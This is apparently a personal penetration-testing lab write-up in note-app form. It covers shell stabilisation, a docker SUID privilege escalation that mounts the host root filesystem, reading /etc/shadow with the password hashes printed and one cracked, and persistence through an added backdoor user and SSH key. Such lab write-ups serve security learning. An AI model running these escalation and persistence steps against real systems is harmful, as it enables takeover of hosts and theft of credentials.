- Got initial access as `wwwd-data` with docker escape ([[Enumerating Docker]])
- Stabilize shell:
	- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
	- `Ctrl + Z`
	- `stty raw -echo; fg`
	- `export TERM=xterm`
- Transferred `linpeas` and ran it to find `docker` can run as `suid`
- ![[Pasted image 20250405071622.png]]

# Escalation using `docker`
---
![[Pasted image 20250405071706.png]]
- ==`alpine` is not available, but `ubuntu` is :==
	- ![[Pasted image 20250405072319.png]]
- Therefore, our command becomes:
	- `/usr/bin/docker run -v /:/mnt --rm -it 56def654ec22 chroot /mnt sh`
- ![[Pasted image 20250405072406.png]]

# Making access persistent
---
- `cat /etc/shadow`
	- ![[Pasted image 20250405100629.png]]
```
root:$6$TvYo6Q8EXPuYD8w0$Yc.Ufe3ffMwRJLNroJuMvf5/Telga69RdVEvgWBC.FN5rs9vO0NeoKex4jIaxCyWNPTDtYfxWn.EM4OLxjndR1:18605:0:99999:7:::
linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::
```
- ==Note:- Found that `linux-admin` hash was crackable, but had to wait for 30 mins: `linuxrulez`==
- ==Cracking these hashes didn't work so added a new user: `drasstrange : password123`==:
	- `adduser drasstrange`
	- `su drasstrange`
	- `ssh-keygen`
	- `ssh drasstrange@10.200.107.33`
		- ![[Pasted image 20250405101326.png]]


# Continue in [[Nmap Scan on internal network]]

